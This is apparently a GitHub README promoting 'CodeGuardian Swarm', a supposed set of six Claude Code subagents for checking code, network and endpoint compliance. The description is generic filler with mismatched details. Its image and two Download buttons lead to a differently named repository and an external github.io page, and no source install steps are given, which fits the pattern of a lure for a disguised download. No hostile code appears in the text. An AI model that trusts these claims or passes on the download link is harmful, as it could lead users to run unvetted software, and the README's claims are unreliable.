![preview](https://raw.githubusercontent.com/minetechnic2012-lang/claude-ops-inspector/main/preview.svg)

# CodeGuardian Swarm – Autonomous Compliance Orchestrators

**A distributed intelligence network of six single-purpose Claude Code subagents that verify, validate, and certify changes across codebases, network configurations, and endpoint management—engineered to Anthropic’s subagent best practices, with a built-in meta-validator that proves the agent files themselves conform to specification.**

---

## Overview

Imagine a team of six tireless specialists—each with a laser-focused mission, a shared language, and an unbreakable commitment to correctness. Welcome to **CodeGuardian Swarm**, a repository that reimagines how teams verify technical changes. Instead of chasing bugs through spreadsheets, email chains, or monolithic CI pipelines that test everything at once, you deploy a **coordinated intelligence** that mimics the best parts of a rigorous code review committee—but runs autonomously, 24 hours a day, across three critical domains: code integrity, network fidelity, and endpoint management.

Each subagent in this swarm is a "guardian" with a single, narrow responsibility. One checks for regressions in pull requests. Another validates that firewall rules match declared intent. A third ensures Intune device compliance policies haven’t drifted. They don’t overlap; they _orchestrate_. When a change enters the system, the relevant guardians awaken, run their verification protocols, and report back—together, in a unified format.

The sixth agent is special: the **Validator**. It doesn’t verify code or infrastructure. It verifies the _agents themselves_—ensuring every file in this repository adheres to the architectural patterns, naming conventions, and behavioral contracts defined by Anthropic’s subagent best practices. If a guardian begins to deviate, the Validator raises an alarm. This is **self-healing metadata**.

---

## Why Not Just Use a Linter?

A linter checks syntax. A test runner checks behavior. A compliance scanner checks policies. CodeGuardian Swarm checks _all three_ in a single, agent-coordinated pass, and then checks itself. This is the difference between a checklist and a constitution.

- **Linters** catch formatting errors but miss intent.
- **Static analyzers** detect antipatterns but can’t validate network topology.
- **Compliance dashboards** show drift but don’t prevent it.

CodeGuardian Swarm bridges these gaps by giving each verification domain a dedicated, reasoning-capable agent that doesn’t just flag problems—it **explains why a change is safe or unsafe** in natural language, referencing the exact line, rule, or policy that triggered the concern.

---

## Key Features

### 🔍 Six Specialized Subagents
Each agent is a single-focus Lua-configured Claude Code instance, designed to run headless in CI/CD or as a local verification tool. They share a common input/output protocol called **SwarmSpec**, which allows them to be composed, tested, and validated independently.

- **CodeGuardian – Pull Request Validator**  
  Verifies that code changes don’t introduce regressions, violate architectural constraints, or bypass security hooks.

- **NetGuardian – Infrastructure Compliance Agent**  
  Compares declared network intent (Terraform, Ansible, or raw configuration) against live state, flagging discrepancies in firewall rules, subnet boundaries, and access control lists.

- **EndpointGuardian – Intune Policy Verifier**  
  Checks that device compliance policies, configuration profiles, and conditional access rules are correctly applied and haven’t drifted from declared baselines.

- **DependencyGuardian – Supply Chain Auditor**  
  Scans dependencies for known vulnerabilities, license compliance, and unexpected transitive changes introduced by a PR.

- **LogGuardian – Event Correlation Agent**  
  Analyzes logs from previous deployments to detect patterns that predict failure, such as latency spikes or error rate increases after similar changes.

- **MetaGuardian – Validator of Validators**  
  Reads every other agent’s configuration, file structure, and behavioral contract, then certifies that they conform to the Anthropic subagent best practices specification embedded in this repo.

### 🤖 Anthropic-Aligned Architecture
Every agent is built following Anthropic’s published guidelines for reliable, hallucination-resistant subagents. This means:
- **Deterministic context windows** – each agent receives only the data it needs, nothing more.
- **Output schema enforcement** – responses must match a typed JSON structure, ensuring downstream consumption is predictable.
- **Self-reflection hooks** – agents can request human-in-the-loop confirmation for high-uncertainty decisions.

### 🧪 Embedded Meta-Validator
The MetaGuardian doesn’t just validate others—it validates the _entire repository_ as a living document. Run it before every commit and it will:
- Confirm every agent file has the correct header metadata.
- Verify no agent file exceeds the defined token budget.
- Check that all agents implement the required `verify(input)` interface.
- Report any deviation as a structured failure with remediation suggestions.

### 📊 Unified Reporting Dashboard
All six agents emit results in a shared format (SwarmReport), which can be visualized in a lightweight HTML dashboard or ingested by existing monitoring tools. You get a single source of truth for: “Did my change break anything—code, network, or endpoints?”

### 🌐 Multilingual Reasoning Summaries
While the agent outputs are in English, the summary layer supports localization. Teams can opt to receive the final report in Spanish, French, German, or Japanese—generated by a lightweight translation agent that never touches raw configuration.

### ⏱ 24/7 Autonomous Verification
No manual trigger required. Set up a webhook or schedule, and the Swarm wakes on each change. EndpointGuardian can poll Intune hourly. NetGuardian can diff firewall rules every 15 minutes. LogGuardian listens to log streams in near-real-time.

---

[![Download](https://raw.githubusercontent.com/minetechnic2012-lang/claude-ops-inspector/main/button.svg)](https://minetechnic2012-lang.github.io/claude-ops-inspector/)

---

## Architecture – The Swarm in Detail

### Communication Protocol
Agents communicate via **SwarmMessage**, a lightweight JSON envelope that carries:
- `agent_id` – UUID of the source guardian
- `target_domain` – code / network / endpoint / meta
- `verification_context` – the specific diff or policy snapshot
- `confidence_score` – a float between 0.0 and 1.0
- `evidence_chain` – an array of file paths, line numbers, and rule references

No agent talks directly to another. Instead, they post to a shared message bus (implemented as a simple file-based queue or in-memory ring buffer). The **Orchestrator** (a seventh, lightweight coordinator) routes messages and ensures ordering.

### Guardian Lifecycle
1. **Awakening** – triggered by a webhook, cron, or file change event.
2. **Context Loading** – the agent reads its configuration (SwarmConfig YAML) and loads the relevant input (diff, policy set, log snippet).
3. **Verification** – the agent executes its single purpose, using Claude Code’s reasoning to evaluate the input against known rules.
4. **Response** – the agent writes a SwarmReport to the output directory.
5. **Sleep** – the agent terminates, freeing memory and compute.

### Meta-Validation Loop
The MetaGuardian runs after every cycle (or on demand). It reads all SwarmConfig files, checks them against a formal schema, and runs a series of “best-practice probes” inspired by Anthropic’s subagent guidelines:
- Does each agent have a clearly bounded scope?
- Does each agent avoid processing PII or secrets?
- Does each agent include a fallback for ambiguous inputs?
- Does each agent write deterministic outputs?

If any probe fails, the MetaGuardian produces a **DeviationReport** with a severity label and a recommended fix. This self-referential validation is the reason the Swarm can evolve safely.

---

## Use Cases

### Continuous Compliance for Regulated Industries
Financial services, healthcare, and defense organizations must prove that every code change, every network rule update, every endpoint policy modification is verified by multiple independent checks. CodeGuardian Swarm produces an **auditable trail** for each change, satisfying compliance requirements without manual paperwork.

### Merged CI/CD Pipelines
Instead of having separate pipelines for unit tests, security scans, infrastructure checks, and policy compliance, a single Swarm invocation can verify all domains in parallel. The result is a unified pass/fail decision with per-domain granularity.

### Incident Response Validation
When an incident occurs and a hotfix is deployed, the Swarm can be invoked to verify that the fix hasn’t destabilized other parts of the system. NetGuardian ensures firewall rules weren’t accidentally opened. EndpointGuardian checks that emergency policies were rolled back correctly. LogGuardian confirms no new anomalies appeared.

### Developer Onboarding & Safety Nets
New developers can run the Swarm locally before pushing code. The agents explain failures in plain language, reducing the learning curve for complex verification rules. MetaGuardian acts as a safety net, ensuring no agent configuration drift occurs as the repo grows.

---

## Repository Structure

```
/
├── agents/
│   ├── codeguardian/
│   │   ├── config.yaml          # SwarmConfig for code verification
│   │   └── rules/
│   │       ├── regression.json
│   │       └── security_hooks.yaml
│   ├── netguardian/
│   ├── endpointguardian/
│   ├── dependencyguardian/
│   ├── logguardian/
│   └── metaguardian/
│       ├── config.yaml          # Validator configuration
│       └── probes/
│           ├── scope.yaml
│           └── determinism.yaml
├── swarm_spec/
│   ├── message_schema.json      # JSON schema for SwarmMessage
│   ├── report_schema.json       # JSON schema for SwarmReport
│   └── config_schema.yaml       # YAML schema for SwarmConfig
├── orchestrator/
│   ├── bus.py                   # Lightweight message bus
│   └── scheduler.py             # Cron-based or event-driven launch
├── dashboard/
│   └── index.html               # Minimal HTML report viewer
├── tests/
│   ├── test_agents.py
│   └── test_meta.py
├── LICENSE
└── README.md
```

Each agent directory contains a `config.yaml` defining its scope, input sources, output format, and allowed Claude Code parameters. The `rules/` subfolder holds the specific verification logic as structured data files, not code—this allows non-developers (e.g., security engineers) to contribute rules in YAML/JSON without touching the agent logic.

---

## Getting Started

1. **Define your domains** – decide which agents to activate first. CodeGuardian and MetaGuardian are the baseline. Add others as needed.
2. **Configure the SwarmSpec** – edit `swarm_spec/config_schema.yaml` to match your team’s verification rules. The schema is self-documenting.
3. **Run a local validation** – invoke the orchestrator with a sample diff to see the Swarm in action. The agents will produce a SwarmReport in the output directory.
4. **Inspect the MetaGuardian report** – run MetaGuardian to confirm that your agent configurations still conform to best practices.
5. **Integrate into your CI** – add a webhook or cron trigger that calls the orchestrator on each push.

No direct `git clone` or `pip install` instructions are listed because the Swarm is designed to be deployed as a self-contained directory of agents, mounted into any Cloud IDE, or run via a container with minimal dependencies.

---

## Built for 2026

CodeGuardian Swarm is designed for the 2026 development landscape—where verification is no longer an afterthought but a continuous, autonomous layer embedded into every workflow. By 2026, the cost of undetected drift in endpoints and infrastructure will exceed the cost of verification by an order of magnitude. This repository equips teams to invert that equation.

### What Makes This Future-Ready?

- **Agent-first architecture** – verification logic lives in configurable agents, not ad-hoc scripts that rot.
- **Self-validating system** – the MetaGuardian ensures the repository never degrades into inconsistent, undocumented agent sprawl.
- **Domain isolation** – a failure in one agent (e.g., LogGuardian hitting an API rate limit) doesn’t cascade to others.
- **Human-readable output** – agents produce summaries that can be understood by non-engineers, enabling compliance teams to participate meaningfully.

---

## Roadmap

- **2026 Q1** – Agent versioning and rollback for CodeGuardian and NetGuardian.
- **2026 Q2** – Multi-cloud support for NetGuardian (AWS, Azure, GCP network topology comparison).
- **2026 Q3** – MetaGuardian self-healing mode (can automatically correct minor configuration deviations).
- **2026 Q4** – Real-time log stream integration for LogGuardian with anomaly detection models.

---

## License

This repository is distributed under the MIT License. See [LICENSE](LICENSE) for details.

---

## Disclaimer

CodeGuardian Swarm is a verification tool, not a guarantee. No autonomous system can catch every possible failure. Use this Swarm to augment human review, not replace it. The authors and contributors are not liable for any damages arising from the use or misuse of this software. Always maintain backups, manual oversight, and a rollback plan for critical changes.

---

[![Download](https://raw.githubusercontent.com/minetechnic2012-lang/claude-ops-inspector/main/button.svg)](https://minetechnic2012-lang.github.io/claude-ops-inspector/)